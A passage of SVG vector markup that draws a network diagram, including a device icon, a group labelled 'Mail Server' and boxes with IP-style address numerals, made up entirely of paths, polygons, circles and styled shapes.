d="m136.55,474.52v4.4c-3.65-7.87-20.19-16.68-22.8-17.24-1.75-.37-3.35-.67-4.31-.84-.59-.11-.94-.17-.94-.17l-.74-1.4-.54-.87,2.2.07c2.56.08,5.06.8,7.26,2.09l17.84,10.42c1.26.74,2.03,2.09,2.03,3.54Z" style="fill: #525a6a;"/>          <path d="m109.32,541.48c-.1.03-.16.04-.16.04l.16-.04Z" style="fill: #2c2c2c;"/>          <path d="m82.47,460.38l24.15-1.9c2.01-.16,3.73,1.3,3.76,3.16l.97,76.93c.02,1.87-1.68,3.36-3.69,3.24l-25.11-1.53c-1.82-.11-3.24-1.51-3.24-3.21v-73.5c0-1.67,1.38-3.06,3.17-3.2Z" style="fill: #89bd27;"/>          <path d="m109.92,537.75c.02,1.84-1.58,3.32-3.49,3.2l-23.74-1.51c-1.72-.11-3.07-1.49-3.07-3.16v-72.53c0-1.65,1.31-3.02,3.01-3.16l6.01-.49,16.86-1.38c1.9-.16,3.54,1.28,3.56,3.12l.33,34.13.49,38.71.04,3.07Z" style="fill: #727c92;"/>          <path d="m109.92,537.7c.02,1.84-1.58,3.32-3.49,3.2l-23.74-1.51c-1.72-.11-3.07-1.49-3.07-3.16v-72.44c0-1.64,1.31-3.02,3-3.16l6-.49,21.25,74.49.04,3.06Z" style="fill: #525a6a; opacity: .65;"/>          <path d="m80.61,464.51v4.27c0,.55.49.99,1.06.95l25.01-1.76c.52-.04.91-.45.91-.95v-4.71c0-.56-.5-1-1.08-.95l-25.01,2.2c-.51.04-.9.46-.9.95Z" style="fill: #d4d8df;"/>          <path d="m80.61,473.07v4.27c0,.55.48.98,1.04.95l25.01-1.32c.52-.03.93-.45.93-.95v-4.71c0-.55-.49-.99-1.06-.95l-25.01,1.76c-.52.04-.91.45-.91.95Z" style="fill: #d4d8df;"/>          <path d="m80.61,481.62v4.27c0,.54.46.97,1.02.95l25.01-.88c.53-.02.95-.44.95-.95v-4.71c0-.55-.48-.98-1.04-.95l-25.01,1.32c-.52.03-.93.45-.93.95Z" style="fill: #d4d8df;"/>          <polygon points="103.35 503.18 103.35 504.48 85.35 504.48 85.35 495 86.01 494.98 86.01 503.18 103.35 503.18" style="fill: #1c2538;"/>          <polygon points="103.35 494.54 103.35 503.18 86.01 503.18 86.01 495 103.35 494.54" style="fill: #d4d8df;"/>          <polyline points="88.3 531.47 88.3 532.94 91.08 532.94 91.08 531.47 88.3 531.47" style="fill: #d4d8df;"/>          <polyline points="95 531.64 95 533.11 98.28 533.11 98.28 531.64 95 531.64" style="fill: #d4d8df;"/>          <polygon points="103.35 499.2 86.17 499.33 86.17 500.19 103.35 500.19 103.35 499.2" style="fill: #1c2538;"/>          <path d="m109.9,537.7c.02,1.84-1.58,3.31-3.48,3.2l-23.72-1.51c-1.72-.11-3.06-1.49-3.06-3.16v-33.48c.46,5.44.05,29.13,3.99,33.32,3.19,3.4,17.46,3.27,21.97,2.24,4.44-1.02,3.66-29.42,3.8-42.31l.5,41.69Z" style="fill: #1c2538;"/>          <polygon points="133.6 479.94 133.81 531.24 132.13 531.65 131.72 478.73 133.6 479.94" style="fill: #727c92; opacity: .65;"/>          <path d="m83.64,536.11l-2.98,2.01-.3.14s.38.73,1.55,1.06l2.75-2.38s-.93-.6-1.02-.81Z" style="fill: #e8e8e8; opacity: .26;"/>          <path d="m80.21,539.1s1.96,1.06,2.91,1.13l22.47,1.45c1.02.07,2.11-.1,2.97-.65l1.75-1.52-.09-.02-1.41.9c-1.13.72-2.53.97-3.87.89l-21.59-1.31c-1-.06-3.15-.86-3.15-.86h0Z" style="fill: #64930a;"/>          <path d="m83.39,538.32s4.88,1.34,11.05,1.52c6.17.18,11.81-.4,13.38-.85,0,0-9.98.62-13.38.49-3.4-.13-11.28-1.25-11.28-1.25" style="fill: #e8e8e8; opacity: .26;"/>          <path d="m108.45,459.23s1.09.91,1.09,2.09c0,1.18.36,27.56.36,27.56,0,0,.81-25.58.5-27.3-.32-1.73-1.95-2.35-1.95-2.35Z" style="fill: #a3ea2a; opacity: .36;"/>        </g>      </g>      <rect x="130.2" y="529.95" width="14.14" height="11.39" style="fill: url(#linear-gradient-6);"/>      <rect x="96.39" y="485.85" width="81.76" height="49.13" rx="1.38" ry="1.38" style="fill: url(#linear-gradient-7);"/>      <path d="m178.15,487.23v42.41h-81.76v-42.41c0-.76.62-1.38,1.38-1.38h79.01c.76,0,1.38.62,1.38,1.38Z" style="fill: url(#linear-gradient-8);"/>      <path d="m124.93,540.3h24.68v1.05c0,.6-.49,1.08-1.08,1.08h-22.51c-.6,0-1.08-.49-1.08-1.08v-1.05h0Z" transform="translate(274.54 1082.73) rotate(180)" style="fill: url(#linear-gradient-9);"/>      <circle cx="137.27" cy="532.89" r="1.41" style="fill: #1c2538;"/>      <path d="m99.41,526.26v-37.14c0-.5.4-.9.9-.9h73.92c.5,0,.9.4.9.9v37.14c0,.68-.57,1.23-1.28,1.23h-73.17c-.71,0-1.28-.55-1.28-1.23Z" style="fill: url(#linear-gradient-10);"/>      <rect x="110.82" y="495.91" width="36.62" height="1.18" style="fill: #a3ea2a;"/>      <rect x="110.84" y="498.91" width="47.44" height="1.18" style="fill: #a3ea2a;"/>      <rect x="110.84" y="501.92" width="51.72" height="1.18" style="fill: #a3ea2a;"/>      <rect x="110.82" y="508.75" width="36.62" height="1.18" style="fill: #a3ea2a;"/>      <rect x="110.84" y="511.75" width="47.44" height="1.18" style="fill: #a3ea2a;"/>      <rect x="110.84" y="514.76" width="51.72" height="1.18" style="fill: #a3ea2a;"/>    </g>  </g>  <g id="Mail_Server" data-name="Mail Server">    <g id="Server_-_small" data-name="Server - small">      <g>        <polygon points="132.15 325.6 127.2 329.53 122.35 325.6 122.35 278.18 132.15 278.18 132.15 325.6" style="fill: #1a1a1a;"/>        <polygon points="77.47 259.31 128.17 237.08 175.66 259.83 126.38 280.91 77.47 259.31" style="fill: url(#linear-gradient-11);"/>        <polyline points="126.8 280.2 127.21 329.58 79.18 308.23 77.48 259.31" style="fill: url(#linear-gradient-12);"/>        <polygon points="126.8 280.21 127.24 329.58 174.83 306.9 175.72 259.76 126.8 280.21" style="fill: url(#linear-gradient-13);"/>        <path d="m133.95,293.79l35.76-16.41c.46-.21.76-.65.79-1.16l.59-9.34c.06-1.02-.98-1.75-1.92-1.33l-36.27,16.14c-.49.22-.81.7-.81,1.24l-.08,9.6c0,1,1.03,1.67,1.93,1.25Z" style="fill: url(#linear-gradient-14);"/>        <path d="m132.14,293.14c.31.64,1.09.97,1.81.65l35.76-16.41c.46-.21.76-.65.79-1.15l.59-9.33c.05-.86-.67-1.52-1.46-1.45.1.2.15.43.13.68l-.59,9.33c-.03.5-.34.95-.79,1.15l-35.76,16.41c-.16.07-.31.11-.47.12Z" style="fill: #1a1a1a;"/>        <path d="m134.34,308.59l35.76-16.41c.46-.21.76-.65.79-1.16l.59-9.34c.06-1.02-.98-1.75-1.92-1.33l-36.27,16.14c-.49.22-.81.7-.81,1.24l-.08,9.6c0,1,1.03,1.67,1.93,1.25Z" style="fill: url(#linear-gradient-15);"/>        <path d="m132.61,307.93c.31.64,1.09.97,1.81.65l35.76-16.41c.46-.21.76-.65.79-1.15l.59-9.33c.05-.86-.67-1.52-1.46-1.45.1.2.15.43.13.68l-.59,9.33c-.03.5-.34.95-.79,1.15l-35.76,16.41c-.16.07-.31.11-.47.12Z" style="fill: #1a1a1a;"/>        <path d="m134.93,323.33l36.45-16.36c.46-.21.76-.65.79-1.16l.59-9.34c.06-1.02-.98-1.75-1.92-1.33l-36.96,16.1c-.49.22-.81.7-.81,1.24l-.08,9.6c0,1,1.03,1.67,1.93,1.25Z" style="fill: url(#linear-gradient-16);"/>        <path d="m133.15,322.68c.31.64,1.09.97,1.81.65l36.45-16.36c.46-.21.76-.65.79-1.15l.59-9.33c.05-.86-.67-1.52-1.46-1.45.1.2.15.43.13.68l-.59,9.33c-.03.5-.34.95-.79,1.15l-36.45,16.36c-.16.07-.31.11-.47.12Z" style="fill: #1a1a1a;"/>        <circle cx="136.13" cy="283.94" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="136.33" cy="288.25" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="141.22" cy="281.79" r="1.08" style="fill: #f2f2f2;"/>        <circle cx="141.55" cy="285.7" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="146.51" cy="279.43" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="146.51" cy="283.74" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="151.61" cy="277.08" r="1.08" style="fill: #eb0037;"/>        <circle cx="151.8" cy="281.2" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="156.7" cy="274.93" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="156.9" cy="278.95" r="1.08" style="fill: #1a1a1a;"/>        <circle cx="161.8" cy="272.38" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="161.81" cy="276.7" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="166.69" cy="270.03" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="166.52" cy="274.14" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="136.72" cy="298.44" r="1.08" style="fill: #f2f2f2;"/>        <circle cx="136.72" cy="302.55" r="1.08" style="fill: #eb0037;"/>        <circle cx="141.81" cy="296.28" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="142.4" cy="300.2" r="1.08" style="fill: #eb0037;"/>        <circle cx="146.91" cy="293.93" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="147.1" cy="298.24" r="1.08" style="fill: #eb0037;"/>        <circle cx="152" cy="291.58" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="152.2" cy="295.7" r="1.08" style="fill: #eb0037;"/>        <circle cx="157.29" cy="289.23" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="157.29" cy="293.54" r="1.08" style="fill: #eb0037;"/>        <circle cx="162.38" cy="286.88" r="1.08" style="fill: #1a1a1a;"/>        <circle cx="162.76" cy="291.11" r="1.08" style="fill: #eb0037;"/>        <circle cx="167.28" cy="284.97" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="167.48" cy="289.1" r="1.08" style="fill: #eb0037;"/>        <circle cx="137.89" cy="313.13" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="137.72" cy="317.25" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="142.99" cy="310.98" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="143.21" cy="314.9" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="148.08" cy="308.63" r="1.08" style="fill: #1a1a1a;"/>        <circle cx="147.91" cy="312.94" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="153.37" cy="306.28" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="153.1" cy="310.39" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="158.47" cy="304.12" r="1.08" style="fill: #eb0037;"/>        <circle cx="158.39" cy="308.24" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="163.56" cy="301.57" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="163.57" cy="306.08" r="1.08" style="fill: #1a1a1a;"/>        <circle cx="168.46" cy="299.22" r="1.08" style="fill: #a3ea2a;"/>        <circle cx="168.1" cy="304.07" r="1.08" style="fill: #a3ea2a;"/>        <polygon points="80.31 262.64 82.52 306.47 124.25 325.58 124.25 281.1 80.31 262.64" style="fill: #272728;"/>        <polygon points="80.22 262.64 81.96 263.29 83.8 306.07 82.43 306.47 80.22 262.64" style="fill: #1a1a1a;"/>        <polygon points="83.89 306.07 124.25 324.69 124.25 325.58 82.52 306.47 83.89 306.07" style="fill: #1a1a1a;"/>        <line x1="87.89" y1="305.34" x2="87.42" y2="288.22" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="90.47" y1="306.52" x2="90" y2="289.39" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="93.05" y1="307.92" x2="92.58" y2="290.8" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="95.63" y1="309.33" x2="95.16" y2="292.21" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="98.21" y1="310.51" x2="97.74" y2="293.38" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="100.79" y1="311.68" x2="100.32" y2="294.55" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="104.03" y1="312.87" x2="103.56" y2="295.75" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="106.61" y1="314.05" x2="106.14" y2="296.92" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="109.19" y1="315.45" x2="108.72" y2="298.33" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="111.77" y1="316.86" x2="111.3" y2="299.74" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="114.35" y1="318.04" x2="113.88" y2="300.91" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <line x1="116.93" y1="319.21" x2="116.46" y2="302.08" style="fill: #eb0037; stroke: #000; stroke-linecap: round; stroke-linejoin: round; stroke-width: 1.17px;"/>        <polygon points="85.73 258.59 126.61 277.95 167.49 259.66 126.61 275.8 85.73 258.59" style="fill: #97afbf; opacity: .25;"/>        <polygon points="83.58 258.59 127.69 239.22 167.49 258.59 127.69 240.3 83.58 258.59" style="fill: #97afbf; opacity: .25;"/>      </g>    </g>  </g>  <rect x="184.46" y="231.6" width="236.24" height="37.96" rx="7.26" ry="7.26" style="fill: #223654;"/>  <rect x="184.46" y="299.07" width="236.24" height="37.96" rx="7.26" ry="7.26" style="fill: #223654;"/>  <g>    <path d="m241.28,245.51c.42-.17.85-.37,1.3-.59.45-.22.89-.46,1.32-.73.43-.26.84-.54,1.23-.84s.75-.6,1.06-.93h2.23v14.88h-3.2v-10.71c-.43.29-.91.55-1.44.78s-1.04.44-1.55.61l-.97-2.47Z" style="fill: #a3ea2a;"/>    <path d="m259.75,251.39c-.3.14-.63.25-1,.31-.37.06-.68.1-.93.1-.93,0-1.72-.11-2.38-.33s-1.2-.54-1.62-.94c-.42-.41-.73-.9-.93-1.47-.2-.57-.3-1.2-.3-1.89,0-.57.1-1.16.29-1.76.19-.6.5-1.15.91-1.64.42-.49.94-.9,1.58-1.22.64-.32,1.41-.48,2.31-.48,1.85,0,3.24.57,4.18,1.71.94,1.14,1.41,2.77,1.41,4.91,0,1.4-.18,2.64-.55,3.71-.37,1.07-.93,1.98-1.7,2.71-.77.73-1.74,1.28-2.93,1.66-1.19.38-2.6.58-4.23.59-.01-.46-.04-.9-.06-1.33-.03-.43-.06-.87-.09-1.33.82-.01,1.55-.08,2.21-.18.66-.11,1.24-.29,1.74-.54.5-.25.93-.58,1.28-1s.63-.94.83-1.57Zm-1.57-2.08c.33,0,.67-.03,1.03-.1s.62-.15.79-.27v-.19c0-.06,0-.11.01-.17,0-.06.01-.11.01-.15-.01-.51-.06-1-.13-1.45-.07-.45-.19-.84-.37-1.18-.17-.34-.4-.6-.7-.79-.29-.19-.65-.29-1.08-.29-.34,0-.64.07-.9.21-.26.14-.47.33-.62.56-.16.23-.28.48-.35.75-.08.27-.12.54-.12.79,0,.77.19,1.35.57,1.72s1,.56,1.86.56Z" style="fill: #a3ea2a;"/>    <path d="m274.82,246.32c0,.54-.11,1.07-.32,1.57s-.49.98-.84,1.45c-.34.46-.73.91-1.16,1.34s-.85.84-1.27,1.22c-.21.2-.45.43-.7.68s-.49.5-.72.76c-.23.26-.43.5-.61.72-.18.22-.29.41-.33.55h6.4v2.68h-9.92c-.03-.16-.04-.36-.04-.6v-.51c0-.69.11-1.32.33-1.89s.51-1.11.87-1.6c.36-.49.76-.96,1.21-1.38.45-.43.9-.86,1.34-1.29.34-.33.67-.64.97-.93s.57-.58.79-.86c.23-.28.41-.56.54-.84s.19-.56.19-.85c0-.63-.18-1.07-.54-1.33-.36-.26-.8-.39-1.33-.39-.39,0-.75.06-1.08.18-.34.12-.64.26-.92.43-.28.17-.52.33-.72.49-.2.17-.35.3-.45.4l-1.59-2.23c.63-.59,1.36-1.07,2.2-1.45.84-.38,1.74-.57,2.69-.57.87,0,1.62.1,2.25.3.63.2,1.15.48,1.56.85.41.37.71.81.9,1.33s.29,1.11.29,1.77Z" style="fill: #a3ea2a;"/>    <path d="m281,255.6c0,.64-.2,1.13-.61,1.47s-.87.5-1.38.5-.98-.17-1.38-.5-.61-.83-.61-1.47.2-1.13.61-1.47c.41-.34.87-.5,1.38-.5s.98.17,1.38.5c.41.34.61.83.61,1.47Z" style="fill: #a3ea2a;"/>    <path d="m283.15,245.51c.42-.17.85-.37,1.3-.59.45-.22.89-.46,1.32-.73.43-.26.84-.54,1.23-.84s.75-.6,1.06-.93h2.23v14.88h-3.2v-10.71c-.43.29-.91.55-1.44.78s-1.04.44-1.55.61l-.97-2.47Z" style="fill: #a3ea2a;"/>    <path d="m300.13,247.8c.93,0,1.72.12,2.37.38.65.25,1.18.59,1.6,1.02.42.43.72.93.9,1.5.19.57.28,1.18.28,1.82,0,.57-.1,1.16-.31,1.76-.21.6-.52,1.15-.94,1.63s-.96.89-1.61,1.2-1.42.47-2.31.47c-1.79,0-3.15-.57-4.08-1.7-.93-1.13-1.4-2.69-1.4-4.68,0-1.43.22-2.7.67-3.8s1.08-2.03,1.9-2.78c.82-.75,1.82-1.32,2.98-1.72,1.17-.39,2.48-.6,3.94-.61.03.44.06.88.09,1.3.03.42.06.86.09,1.32-.73.01-1.41.08-2.05.2-.64.12-1.22.31-1.74.57-.52.26-.98.59-1.36,1-.39.41-.69.91-.9,1.49.31-.14.64-.24.97-.3.33-.06.64-.09.92-.09Zm-.41,2.49c-.31,0-.65.03-1.01.09-.36.06-.64.14-.84.24,0,.06,0,.14-.01.26,0,.12-.01.21-.01.3,0,.52.04,1,.11,1.46.07.46.19.86.37,1.2.17.34.4.61.69.81.29.19.64.29,1.07.29.36,0,.66-.08.91-.23.25-.15.46-.34.62-.57.16-.23.29-.48.37-.76.08-.28.12-.55.12-.81,0-.73-.18-1.29-.55-1.69-.37-.39-.98-.59-1.84-.59Z" style="fill: #a3ea2a;"/>    <path d="m317.41,253.14c0,.64-.11,1.24-.33,1.77-.22.54-.56,1.01-1,1.41s-1,.71-1.66.94c-.67.22-1.43.33-2.31.33-1,0-1.84-.14-2.5-.42-.67-.28-1.2-.63-1.61-1.04s-.7-.87-.87-1.37c-.17-.5-.26-.95-.26-1.37s.06-.82.17-1.18c.11-.36.27-.68.47-.98s.43-.56.68-.81c.25-.24.52-.47.8-.69-.62-.5-1.07-.99-1.36-1.48-.29-.49-.44-1.11-.44-1.87,0-.57.12-1.12.35-1.65.24-.53.57-.99,1-1.38.43-.39.95-.71,1.56-.94.61-.24,1.29-.35,2.03-.35.87,0,1.62.12,2.24.38.62.25,1.13.57,1.54.95.4.39.69.82.87,1.3.18.48.27.95.27,1.43,0,.69-.18,1.33-.55,1.92-.37.59-.82,1.06-1.36,1.4.82.53,1.4,1.09,1.75,1.67.35.58.53,1.26.53,2.03Zm-7.43.13c0,.17.04.36.12.57.08.21.2.4.38.57.17.17.39.32.67.43.27.12.6.17.99.17.74,0,1.29-.18,1.63-.54.34-.36.51-.76.51-1.21,0-.33-.07-.62-.22-.88-.15-.26-.35-.48-.61-.68-.26-.19-.56-.37-.91-.52-.35-.15-.73-.29-1.13-.42-.4.3-.74.65-1.01,1.05-.27.4-.41.88-.41,1.44Zm3.97-7.06c0-.16-.03-.32-.1-.5-.06-.18-.17-.35-.32-.5s-.34-.29-.57-.4c-.23-.11-.51-.16-.84-.16s-.59.05-.82.15c-.23.1-.42.23-.57.4s-.26.34-.33.52-.11.36-.11.54c0,.46.17.88.5,1.29.34.4.91.74,1.73,1.03.46-.29.81-.61,1.05-.98.24-.37.37-.83.37-1.37Z" style="fill: #a3ea2a;"/>    <path d="m322.87,255.6c0,.64-.2,1.13-.61,1.47s-.87.5-1.38.5-.98-.17-1.38-.5-.61-.83-.61-1.47.2-1.13.61-1.47c.41-.34.87-.5,1.38-.5s.98.17,1.38.5c.41.34.61.83.61,1.47Z" style="fill: #a3ea2a;"/>    <path d="m325.01,245.51c.42-.17.85-.37,1.3-.59.45-.22.89-.46,1.32-.73.43-.26.84-.54,1.23-.84s.75-.6,1.06-.93h2.23v14.88h-3.2v-10.71c-.43.29-.91.55-1.44.78s-1.04.44-1.55.61l-.97-2.47Z" style="fill: #a3ea2a;"/>    <path d="m340.34,255.6c0,.64-.2,1.13-.61,1.47s-.87.5-1.38.5-.98-.17-1.38-.5-.61-.83-.61-1.47.2-1.13.61-1.47c.41-.34.87-.5,1.38-.5s.98.17,1.38.5c.41.34.61.83.61,1.47Z" style="fill: #a3ea2a;"/>    <path d="m342.49,245.51c.42-.17.85-.37,1.3-.59.45-.22.89-.46,1.32-.73.43-.26.84-.54,1.23-.84s.75-.6,1.06-.93h2.23v14.88h-3.2v-10.71c-.43.29-.91.55-1.44.78s-1.04.44-1.55.61l-.97-2.47Z" style="fill: #a3ea2a;"/>    <path d="m364.65,249.82c0,2.5-.48,4.43-1.43,5.76-.95,1.34-2.26,2.01-3.94,2.01s-2.99-.67-3.94-2.01c-.95-1.34-1.43-3.26-1.43-5.76,0-1.25.12-2.35.38-3.31.25-.96.61-1.77,1.08-2.43.47-.66,1.04-1.16,1.7-1.5.66-.34,1.4-.51,2.21-.51,1.67,0,2.99.67,3.94,2.01.95,1.34,1.43,3.25,1.43,5.74Zm-3.26,0c0-.74-.04-1.42-.11-2.03-.07-.61-.19-1.13-.34-1.58-.16-.44-.37-.79-.64-1.03-.27-.24-.61-.36-1.01-.36s-.73.12-1,.36c-.27.24-.48.59-.64,1.03-.17.44-.28.97-.35,1.58-.07.61-.11,1.28-.11,2.03s.04,1.42.11,2.04c.07.62.19,1.15.35,1.59.16.44.38.79.64,1.03.26.24.6.37,1,.37s.74-.12,1.01-.37c.27-.24.49-.59.64-1.03.16-.44.27-.97.34-1.59.07-.62.11-1.3.11-2.04Z" style="fill: #a3ea2a;"/>  </g>  <rect x="612.36" y="236.12" width="236.24" height="37.96" rx="7.26" ry="7.26" style="fill: #223654;"/>  <g>    <path d="m679.06,257.67c0,.64-.11,1.24-.33,1.77-.22.54-.56,1.01-1,1.41-.44.4-1,.71-1.66.94-.67.22-1.44.33-2.31.33-1,0-1.84-.14-2.5-.42s-1.2-.63-1.61-1.04c-.41-.42-.7-.87-.87-1.37-.17-.5-.26-.95-.26-1.37s.06-.82.17-1.18c.11-.36.27-.68.47-.98.2-.29.43-.56.68-.81.25-.24.52-.47.81-.69-.62-.5-1.07-.99-1.36-1.48-.29-.49-.44-1.11-.44-1.87,0-.57.12-1.12.35-1.65.24-.53.57-.99,1-1.38.43-.39.95-.71,1.56-.94.61-.24,1.28-.35,2.03-.35.87,0,1.62.12,2.24.38s1.13.57,1.54.95.69.82.87,1.3c.18.48.27.95.27,1.43,0,.69-.18,1.33-.55,1.92-.36.59-.82,1.06-1.36,1.4.82.53,1.4,1.09,1.75,1.67.35.58.53,1.26.53,2.03Zm-7.43.13c0,.17.04.36.12.57s.2.4.38.57c.17.17.39.32.67.43.27.12.6.17.99.17.74,0,1.29-.18,1.63-.54.34-.36.52-.76.52-1.21,0-.33-.07-.62-.23-.88-.15-.26-.35-.48-.61-.68-.26-.19-.56-.37-.91-.52-.35-.15-.73-.29-1.13-.42-.4.3-.74.65-1.01,1.05-.27.4-.41.88-.41,1.44Zm3.97-7.06c0-.16-.03-.32-.1-.5-.06-.18-.17-.35-.32-.5-.15-.16-.34-.29-.57-.4-.23-.11-.51-.16-.84-.16s-.59.05-.82.15c-.23.1-.42.23-.57.4-.15.16-.26.34-.33.52-.07.19-.11.36-.11.54,0,.46.17.88.5,1.29.34.4.91.74,1.73,1.03.46-.29.81-.61,1.05-.98.24-.37.37-.83.37-1.37Z" style="fill: #a3ea2a;"/>    <path d="m690.52,250.84c0,.54-.11,1.07-.32,1.57-.21.5-.49.98-.84,1.45-.34.46-.73.91-1.16,1.34-.43.43-.85.84-1.27,1.22-.21.2-.45.43-.7.68-.25.25-.49.5-.72.76s-.43.5-.61.72c-.18.22-.29.41-.33.55h6.4v2.68h-9.92c-.03-.16-.04-.36-.04-.6v-.51c0-.69.11-1.32.33-1.89.22-.57.51-1.11.87-1.6.36-.49.76-.96,1.21-1.38s.9-.86,1.34-1.29c.34-.33.67-.64.97-.93.3-.29.56-.58.79-.86.23-.28.41-.56.54-.84s.19-.56.19-.85c0-.63-.18-1.07-.54-1.33-.36-.26-.8-.39-1.33-.39-.39,0-.75.06-1.08.18-.34.12-.64.26-.92.43-.28.17-.52.33-.72.49-.2.17-.35.3-.45.4l-1.59-2.23c.63-.59,1.36-1.07,2.2-1.45.84-.38,1.74-.57,2.69-.57.87,0,1.62.1,2.25.3.63.2,1.15.48,1.56.85.41.37.71.81.9,1.33.19.52.29,1.11.29,1.77Z" style="fill: #a3ea2a;"/>    <path d="m696.71,260.12c0,.64-.2,1.13-.61,1.47-.41.34-.87.5-1.38.5s-.98-.17-1.38-.5c-.41-.34-.61-.83-.61-1.47s.2-1.13.61-1.47c.41-.34.87-.5,1.38-.5s.98.17,1.38.5c.41.34.61.83.61,1.47Z" style="fill: #a3ea2a;"/>    <path d="m703.64,252.33c.93,0,1.72.12,2.37.38.65.25,1.18.59,1.6,1.02.42.43.72.93.9,1.5s.28,1.18.28,1.82c0,.57-.1,1.16-.31,1.76-.21.6-.52,1.15-.94,1.63-.42.49-.96.89-1.61,1.2s-1.42.47-2.31.47c-1.79,0-3.15-.57-4.08-1.7-.93-1.13-1.4-2.69-1.4-4.68,0-1.43.22-2.7.67-3.8.44-1.1,1.08-2.03,1.9-2.78.82-.75,1.82-1.32,2.98-1.72s2.48-.6,3.94-.61c.03.44.06.88.09,1.3.03.42.06.86.09,1.32-.73.01-1.41.08-2.05.2-.64.12-1.22.31-1.74.57-.52.26-.98.59-1.36,1-.39.41-.69.91-.9,1.49.31-.14.64-.24.97-.3.33-.06.64-.09.92-.09Zm-.41,2.49c-.31,0-.65.03-1.01.09s-.64.14-.84.24c0,.06,0,.14-.01.26,0,.12-.01.21-.01.3,0,.52.04,1,.11,1.46s.19.86.37,1.2c.17.34.4.61.69.81.29.19.64.29,1.07.29.36,0,.66-.08.91-.23s.46-.34.62-.57c.16-.23.29-.48.37-.76.08-.28.12-.55.12-.81,0-.73-.18-1.29-.55-1.69-.36-.39-.98-.59-1.84-.59Z" style="fill: #a3ea2a;"/>    <path d="m720.19,250.84c0,.54-.11,1.07-.32,1.57-.21.5-.49.98-.84,1.45-.34.46-.73.91-1.16,1.34-.43.43-.85.84-1.27,1.22-.21.2-.45.43-.7.68-.25.25-.49.5-.72.76s-.43.5-.61.72c-.18.22-.29.41-.33.55h6.4v2.68h-9.92c-.03-.16-.04-.36-.04-.6v-.51c0-.69.11-1.32.33-1.89.22-.57.51-1.11.87-1.6.36-.49.76-.96,1.21-1.38s.9-.86,1.34-1.29c.34-.33.67-.64.97-.93.3-.29.56-.58.79-.86.23-.28.41-.56.54-.84s.19-.56.19-.85c0-.63-.18-1.07-.54-1.33-.36-.26-.8-.39-1.33-.39-.39,0-.75.06-1.08.18-.34.12-.64.26-.92.43-.28.17-.52.33-.72.49-.2.17-.35.3-.45.4l-1.59-2.23c.63-.59,1.36-1.07,2.2-1.45.84-.38,1.74-.57,2.69-.57.87,0,1.62.1,2.25.3.63.2,1.15.48,1.56.85.41.37.71.81.9,1.33.19.52.29,1.11.29,1.77Z" style="fill: #a3ea2a;"/>    <path d="m726.38,260.12c0,.64-.2,1.13-.61,1.47-.41.34-.87.5-1.38.5s-.98-.17-1.38-.5c-.41-.34-.61-.83-.61-1.47s.2-1.13.61-1.47c.41-.34.87-.5,1.38-.5s.98.17,1.38.5c.41.34.61.83.61,1.47Z" style="fill: #a3ea2a;"/>    <path d="m734.75,257.44c0-.42-.09-.78-.28-1.11-.19-.32-.51-.59-.97-.81-.46-.21-1.07-.38-1.85-.49-.77-.11-1.75-.17-2.92-.17.16-1.33.29-2.68.39-4.06s.18-2.66.24-3.87h8.05v2.68h-5.37c-.03.51-.06,1.01-.1,1.49-.04.48-.08.9-.12,1.26,2.09.14,3.63.63,4.63,1.47.99.84,1.49,2,1.49,3.49,0,.69-.12,1.32-.37,1.91-.24.59-.61,1.09-1.09,1.52-.49.43-1.1.77-1.84,1.01s-1.6.37-2.59.37c-.39,0-.79-.03-1.21-.08-.42-.05-.83-.12-1.22-.19s-.75-.16-1.06-.25c-.31-.09-.56-.17-.73-.26l.58-2.64c.36.16.83.31,1.42.46s1.29.23,2.1.23c.99,0,1.7-.2,2.15-.59.44-.39.67-.86.67-1.38Z" style="fill: #a3ea2a;"/>    <path d="m740.72,250.03c.42-.17.85-.37,1.3-.59s.89-.46,1.32-.73c.43-.26.84-.54,1.23-.84.39-.29.75-.6,1.06-.93h2.23v14.88h-3.2v-10.71c-.43.29-.91.55-1.44.78-.53.24-1.04.44-1.55.61l-.97-2.47Z" style="fill: #a3ea2a;"/>    <path 